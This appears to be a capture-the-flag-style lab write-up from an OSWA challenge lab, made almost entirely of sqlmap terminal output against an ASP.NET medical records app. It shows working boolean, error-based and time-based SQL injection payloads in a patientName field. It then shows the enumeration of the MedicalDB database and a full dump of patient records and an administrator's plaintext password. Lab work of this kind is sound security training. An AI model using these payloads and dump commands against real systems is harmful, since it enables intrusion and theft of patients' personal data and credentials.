sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:                                                                                                                    
---                                                                                                                                                                                                        
Parameter: #1* ((custom) POST)                                                                                             
    Type: boolean-based blind                                                                                              
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                
    Payload: __VIEWSTATE=YkTmf2ubBRXXceJVhB5wLRNB0Qr2tOT5UtlyuwYhnISEvQtYuk+kzWqM4xo2VOJ52m+v1XHl1hPuZuDCVpsrae34pG6iT0LmCzFx6KISyzc=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=AgS9jyOHvWbiXaZ8rdL/z
fa5ZC0qMlF+kWXSB5AJwxHlop5QfGWySbcFJY3fsZSvEDwq7yni0OfgR2g+aM7gGYsoVGcBoFrWsv+FjvPD/ClclFgxqEk66JtDNBJ3k0Qjpkr4A2GTriDtDHKfMAnZgrpfS8chvkj0feNpxCA+nW4=&patientName=%' AND 7909=7909 AND 'WhBD%'='WhBD&test
Date=2024-12-25&viewResults=View Results                                                                                                                                                                   
    Type: error-based                                                                                                      
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)                                       
    Payload: __VIEWSTATE=YkTmf2ubBRXXceJVhB5wLRNB0Qr2tOT5UtlyuwYhnISEvQtYuk+kzWqM4xo2VOJ52m+v1XHl1hPuZuDCVpsrae34pG6iT0LmCzFx6KISyzc=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=AgS9jyOHvWbiXaZ8rdL/z
fa5ZC0qMlF+kWXSB5AJwxHlop5QfGWySbcFJY3fsZSvEDwq7yni0OfgR2g+aM7gGYsoVGcBoFrWsv+FjvPD/ClclFgxqEk66JtDNBJ3k0Qjpkr4A2GTriDtDHKfMAnZgrpfS8chvkj0feNpxCA+nW4=&patientName=%' AND 8669 IN (SELECT (CHAR(113) CHAR(
98) CHAR(113) CHAR(120) CHAR(113) (SELECT (CASE WHEN (8669=8669) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(106) CHAR(113) CHAR(106) CHAR(113))) AND 'GJHV%'='GJHV&testDate=2024-12-25&viewResults=Vi
ew Results      

    Type: time-based blind                                                                                                 
    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)                                                  
    Payload: __VIEWSTATE=YkTmf2ubBRXXceJVhB5wLRNB0Qr2tOT5UtlyuwYhnISEvQtYuk+kzWqM4xo2VOJ52m+v1XHl1hPuZuDCVpsrae34pG6iT0LmCzFx6KISyzc=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=AgS9jyOHvWbiXaZ8rdL/z
fa5ZC0qMlF+kWXSB5AJwxHlop5QfGWySbcFJY3fsZSvEDwq7yni0OfgR2g+aM7gGYsoVGcBoFrWsv+FjvPD/ClclFgxqEk66JtDNBJ3k0Qjpkr4A2GTriDtDHKfMAnZgrpfS8chvkj0feNpxCA+nW4=&patientName=%' AND 6705=(SELECT COUNT(*) FROM sysus
ers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'XrkX%'='XrkX&testDate=2024-12-25&viewResults=View Results                          
---                                                                                                                                                                                                        
[13:27:40] [INFO] the back-end DBMS is Microsoft SQL Server                                                
web server operating system: Windows 2022 or 11 or 10 or 2016 or 2019                                    
web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET                                                                                              
back-end DBMS: Microsoft SQL Server 2022                                                                                                                                                                   
[13:27:40] [INFO] fetching database names                                                                   
[13:27:40] [INFO] retrieved: 'master'                                                                       
[13:27:40] [INFO] retrieved: 'MedicalDB'                                                                      
[13:27:40] [INFO] retrieved: 'model'                               
[13:27:40] [INFO] retrieved: 'msdb'                                     
[13:27:40] [INFO] retrieved: 'tempdb'                                                                                                                                                                      
available databases [5]:                                                                                   
[*] master                                                                                              
[*] MedicalDB                                                                                               
[*] model                                                                                                    
[*] msdb                                                                           
[*] tempdb            
```
dumping the `--tables` from the `MedicalDB` 
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[18Dec2024 13:27:40]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]                                      
â””â”€# sqlmap -r tstres_req1_day2.txt -p patientName -D MedicalDB --tables --batch                                                                                                                            
        ___                                                                                                             
       __H__                                                                                                               
 ___ ___[)]_____ ___ ___  {1.8.12.2#dev}                                                                                   
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers a
ssume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:28:32 /2024-12-18/

[13:28:32] [INFO] parsing HTTP request from 'tstres_req1_day2.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[13:28:32] [INFO] resuming back-end DBMS 'microsoft sql server' 
[13:28:32] [INFO] testing connection to the target URL
[13:28:32] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: __VIEWSTATE=YkTmf2ubBRXXceJVhB5wLRNB0Qr2tOT5UtlyuwYhnISEvQtYuk+kzWqM4xo2VOJ52m+v1XHl1hPuZuDCVpsrae34pG6iT0LmCzFx6KISyzc=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=AgS9jyOHvWbiXaZ8rdL/z
fa5ZC0qMlF+kWXSB5AJwxHlop5QfGWySbcFJY3fsZSvEDwq7yni0OfgR2g+aM7gGYsoVGcBoFrWsv+FjvPD/ClclFgxqEk66JtDNBJ3k0Qjpkr4A2GTriDtDHKfMAnZgrpfS8chvkj0feNpxCA+nW4=&patientName=%' AND 7909=7909 AND 'WhBD%'='WhBD&test
Date=2024-12-25&viewResults=View Results

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: __VIEWSTATE=YkTmf2ubBRXXceJVhB5wLRNB0Qr2tOT5UtlyuwYhnISEvQtYuk+kzWqM4xo2VOJ52m+v1XHl1hPuZuDCVpsrae34pG6iT0LmCzFx6KISyzc=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=AgS9jyOHvWbiXaZ8rdL/z
fa5ZC0qMlF+kWXSB5AJwxHlop5QfGWySbcFJY3fsZSvEDwq7yni0OfgR2g+aM7gGYsoVGcBoFrWsv+FjvPD/ClclFgxqEk66JtDNBJ3k0Qjpkr4A2GTriDtDHKfMAnZgrpfS8chvkj0feNpxCA+nW4=&patientName=%' AND 8669 IN (SELECT (CHAR(113) CHAR(
98) CHAR(113) CHAR(120) CHAR(113) (SELECT (CASE WHEN (8669=8669) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(106) CHAR(113) CHAR(106) CHAR(113))) AND 'GJHV%'='GJHV&testDate=2024-12-25&viewResults=Vi
ew Results

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
    Payload: __VIEWSTATE=YkTmf2ubBRXXceJVhB5wLRNB0Qr2tOT5UtlyuwYhnISEvQtYuk+kzWqM4xo2VOJ52m+v1XHl1hPuZuDCVpsrae34pG6iT0LmCzFx6KISyzc=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=AgS9jyOHvWbiXaZ8rdL/z
fa5ZC0qMlF+kWXSB5AJwxHlop5QfGWySbcFJY3fsZSvEDwq7yni0OfgR2g+aM7gGYsoVGcBoFrWsv+FjvPD/ClclFgxqEk66JtDNBJ3k0Qjpkr4A2GTriDtDHKfMAnZgrpfS8chvkj0feNpxCA+nW4=&patientName=%' AND 6705=(SELECT COUNT(*) FROM sysus
ers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'XrkX%'='XrkX&testDate=2024-12-25&viewResults=View Results
---
[13:28:32] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2022 or 2019 or 2016 or 10 or 11
web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET
back-end DBMS: Microsoft SQL Server 2022
[13:28:32] [INFO] fetching tables for database: MedicalDB
[13:28:32] [WARNING] the SQL query provided does not return any output
[13:28:32] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[13:28:32] [INFO] retrieved: 'dbo.Appointments'
[13:28:32] [INFO] retrieved: 'dbo.Patients'
[13:28:33] [INFO] retrieved: 'dbo.TestResults'
[13:28:33] [INFO] retrieved: 'dbo.TestTypes'
[13:28:33] [INFO] retrieved: 'dbo.Users'
Database: MedicalDB
[5 tables]
+--------------+
| Appointments |
| Patients     |
| TestResults  |
| TestTypes    |
| Users        |
+--------------+
```
Dumping `--columns` from the `--tables` in the `MedicationDB` and got `administrator` credentials
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[18Dec2024 13:28:33]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]                                      
â””â”€# sqlmap -r tstres_req1_day2.txt -D MedicalDB -T Users --columns --batch                                                                                                                                 
        ___                                                                                                                
       __H__                                                                                                               
 ___ ___[']_____ ___ ___  {1.8.12.2#dev}                                                                                   
|_ -| . [(]     | .'| . |                                                                                                  
|___|_  ["]_|_|_|__,|  _|                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                 
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers a
ssume no liability and are not responsible for any misuse or damage caused by this program                                                                                                                 

[*] starting @ 13:28:59 /2024-12-18/                                                                                       
[13:28:59] [INFO] parsing HTTP request from 'tstres_req1_day2.txt'                                                                                                                                         
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y                                                                                                                     
[13:28:59] [INFO] resuming back-end DBMS 'microsoft sql server'                                                                                                                                            
[13:28:59] [INFO] testing connection to the target URL                                                                                                                                                     
[13:28:59] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS                                                                                                    
sqlmap resumed the following injection point(s) from stored session:                                                                                                                                       
---                                                                                                                                                                                                        
Parameter: #1* ((custom) POST)                                                                                                                                                                             
    Type: boolean-based blind                                                                                                                                                                              
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                                                                                
    Payload: __VIEWSTATE=YkTmf2ubBRXXceJVhB5wLRNB0Qr2tOT5UtlyuwYhnISEvQtYuk+kzWqM4xo2VOJ52m+v1XHl1hPuZuDCVpsrae34pG6iT0LmCzFx6KISyzc=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=AgS9jyOHvWbiXaZ8rdL/z
fa5ZC0qMlF+kWXSB5AJwxHlop5QfGWySbcFJY3fsZSvEDwq7yni0OfgR2g+aM7gGYsoVGcBoFrWsv+FjvPD/ClclFgxqEk66JtDNBJ3k0Qjpkr4A2GTriDtDHKfMAnZgrpfS8chvkj0feNpxCA+nW4=&patientName=%' AND 7909=7909 AND 'WhBD%'='WhBD&test
Date=2024-12-25&viewResults=View Results                                                                                                                                                                   
    Type: error-based                                                                                                                                                                                      
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)                                                                                                                       
    Payload: __VIEWSTATE=YkTmf2ubBRXXceJVhB5wLRNB0Qr2tOT5UtlyuwYhnISEvQtYuk+kzWqM4xo2VOJ52m+v1XHl1hPuZuDCVpsrae34pG6iT0LmCzFx6KISyzc=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=AgS9jyOHvWbiXaZ8rdL/z
fa5ZC0qMlF+kWXSB5AJwxHlop5QfGWySbcFJY3fsZSvEDwq7yni0OfgR2g+aM7gGYsoVGcBoFrWsv+FjvPD/ClclFgxqEk66JtDNBJ3k0Qjpkr4A2GTriDtDHKfMAnZgrpfS8chvkj0feNpxCA+nW4=&patientName=%' AND 8669 IN (SELECT (CHAR(113) CHAR(
98) CHAR(113) CHAR(120) CHAR(113) (SELECT (CASE WHEN (8669=8669) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(106) CHAR(113) CHAR(106) CHAR(113))) AND 'GJHV%'='GJHV&testDate=2024-12-25&viewResults=Vi
ew Results                                                                                           
    Type: time-based blind                                                                                                                                                                                 
    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)                                                                                                                                  
    Payload: __VIEWSTATE=YkTmf2ubBRXXceJVhB5wLRNB0Qr2tOT5UtlyuwYhnISEvQtYuk+kzWqM4xo2VOJ52m+v1XHl1hPuZuDCVpsrae34pG6iT0LmCzFx6KISyzc=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=AgS9jyOHvWbiXaZ8rdL/z
fa5ZC0qMlF+kWXSB5AJwxHlop5QfGWySbcFJY3fsZSvEDwq7yni0OfgR2g+aM7gGYsoVGcBoFrWsv+FjvPD/ClclFgxqEk66JtDNBJ3k0Qjpkr4A2GTriDtDHKfMAnZgrpfS8chvkj0feNpxCA+nW4=&patientName=%' AND 6705=(SELECT COUNT(*) FROM sysus
ers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'XrkX%'='XrkX&testDate=2024-12-25&viewResults=View Results
---
[13:28:59] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 11 or 2022 or 10 or 2016 or 2019
web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET
back-end DBMS: Microsoft SQL Server 2022
[13:28:59] [INFO] fetching columns for table 'Users' in database 'MedicalDB'
[13:29:00] [INFO] retrieved: 'CreatedDate'
[13:29:00] [INFO] retrieved: 'Email'
[13:29:00] [INFO] retrieved: 'FullName'
[13:29:00] [INFO] retrieved: 'Password'
[13:29:00] [INFO] retrieved: 'UserID'
[13:29:00] [INFO] retrieved: 'Username'
Database: MedicalDB
Table: Users
[6 columns]
+-------------+
| Column      |
+-------------+
| CreatedDate |
| Email       |
| FullName    |
| Password    |
| UserID      |
| Username    |
+-------------+
```
dumping `everything`
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[18Dec2024 13:29:01]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]                                   
â””â”€# sqlmap -r tstres_req1_day2.txt -p patientName -D MedicalDB -T Users --dump-all --batch      
Database: MedicalDB
Table: Appointments
[8 entries]
+----+-----------+--------------------------------+-----------+-----------+---------------------+------------------------+---------------------+
| ID | PatientID | Notes                          | Status    | CreatedBy | CreatedDate         | Description            | AppointmentDate     |
+----+-----------+--------------------------------+-----------+-----------+---------------------+------------------------+---------------------+
| 1  | 1         | First visit of the year        | Pending   | admin     | Mar 20 2024  9:15AM | Regular Checkup        | Mar 25 2024 10:30AM |
| 2  | 2         | Blood pressure follow-up       | Pending   | admin     | Mar 20 2024 11:30AM | Follow-up Consultation | Mar 26 2024  2:15PM |
| 3  | 3         | Fasting required               | Confirmed | admin     | Mar 19 2024  1:45PM | Diabetes Screening     | Mar 24 2024  9:00AM |
| 4  | 4         | Complete health checkup        | Confirmed | admin     | Mar 18 2024 10:20AM | Annual Physical        | Mar 27 2024 11:30AM |
| 5  | 1         | COVID-19 booster shot          | Completed | admin     | Mar 10 2024  9:00AM | Vaccination            | Mar 15 2024  3:45PM |
| 6  | 2         | Cholesterol levels discussion  | Completed | admin     | Mar 13 2024  2:30PM | Blood Test Review      | Mar 17 2024  1:20PM |
| 7  | 5         | Patient requested cancellation | Cancelled | admin     | Mar 16 2024 11:45AM | General Consultation   | Mar 19 2024  4:00PM |
| 8  | 3         | Doctor unavailable             | Cancelled | admin     | Mar 15 2024  3:20PM | Eye Examination        | Mar 18 2024 10:30AM |
+----+-----------+--------------------------------+-----------+-----------+---------------------+------------------------+---------------------+
Database: MedicalDB
Table: Patients
[5 entries]
+----+-------------------------------+--------------+-------------+---------------+---------------+
| ID | Email                         | Name         | DateOfBirth | ContactNumber | PatientNumber |
+----+-------------------------------+--------------+-------------+---------------+---------------+
| 1  | john.smith@solarmedical.com   | John Smith   | 1980-05-15  | 555-0101      | P2023001      |
| 2  | mary.j@solarmedical.com       | Mary Johnson | 1975-08-22  | 555-0102      | P2023002      |
| 3  | sarah.wilson@solarmedical.com | Sarah Wilson | 1990-03-10  | 555-0103      | P2023003      |
| 4  | robert.b@solarmedical.com     | Robert Brown | 1965-11-30  | 555-0104      | P2023004      |
| 5  | emily.davis@solarmedical.com  | Emily Davis  | 1988-07-25  | 555-0105      | P2023005      |
+----+-------------------------------+--------------+-------------+---------------+---------------+

Database: MedicalDB
Table: Users
[1 entry]
+--------+------------------------+----------------------+----------------------+----------+---------------------+
| UserID | Email                  | FullName             | Password             | Username | CreatedDate         |
+--------+------------------------+----------------------+----------------------+----------+---------------------+
| 1      | admin@solarmedical.com | System Administrator | TLyjybuktHmL3J9qadfV | admin    | Nov 19 2024  3:45PM |
+--------+------------------------+----------------------+----------------------+----------+---------------------+

```